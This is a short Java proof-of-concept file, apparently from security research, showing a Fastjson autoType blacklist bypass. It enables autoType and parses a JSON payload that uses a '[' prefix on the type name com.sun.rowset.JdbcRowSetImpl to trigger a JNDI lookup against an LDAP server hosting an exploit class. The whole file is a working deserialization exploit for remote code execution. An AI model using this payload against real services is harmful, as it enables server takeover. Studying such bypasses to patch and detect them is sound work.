import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
/*
*
* 没啥好分析的，利用TypeUtils.loadClass中的[再绕过一次
* */
public class FastJson_DoubleBypass3 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,{\"dataSourceName\":\"ldap://127.0.0.1:8085/exp\",\"autoCommit\":true}";
        JSON.parse(payload);
    }
}
